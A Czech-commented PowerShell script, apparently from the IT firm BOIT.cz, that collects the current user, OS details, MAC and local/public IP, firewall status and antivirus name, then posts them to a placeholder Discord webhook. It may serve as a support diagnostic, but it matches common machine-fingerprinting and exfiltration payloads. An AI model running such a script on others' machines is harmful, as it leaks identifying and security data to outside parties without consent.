# Shromažďování informací do proměnné
$output = "Prihlaseny uzivatel: $currentUser" + "`n`n"

$osInfo = Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
$output += "Informace o Windows 11: $osInfo" + "`n`n"

$macAddress = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -ExpandProperty MacAddress
$output += "MAC adresa: $macAddress" + "`n`n"

$localIP = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.AddressState -eq "Preferred" -and $_.InterfaceAlias -notlike "Loopback*" } | Select-Object -ExpandProperty IPAddress
$output += "Lokalni IP adresa: $localIP" + "`n`n"

$publicIP = Invoke-RestMethod -Uri "http://icanhazip.com"
$output += "Verejna IP adresa: $publicIP" + "`n`n"

$firewallStatus = Get-NetFirewallProfile | Format-Table Name, Enabled -AutoSize | Out-String
$output += "Stav firewallu:" + "`n" + $firewallStatus + "`n`n"

$antivirusName = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
$output += "Antivirus: $antivirusName" + "`n`n"

$pingResult = Test-Connection -ComputerName "boit.cz" -Count 1 -ErrorAction SilentlyContinue
if ($pingResult) {
    $output += "Ping na boit.cz: Cas odezvy - $($pingResult.ResponseTime)ms" + "`n`n"
} else {
    $output += "Ping na boit.cz: Nebylo mozne dosahnout hostitele" + "`n`n"
}

$output += "S pozdravem Spajk z BOIT.cz" + "`n`n"

# Nastavení webhook URL - nastavte si vlastní
$webhookUrl = 'https://webhook-URL-TO-CHANGE'

# Příprava dat pro odeslání
$body = @{
    content = $output
} | ConvertTo-Json

# Odeslání dat na Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'

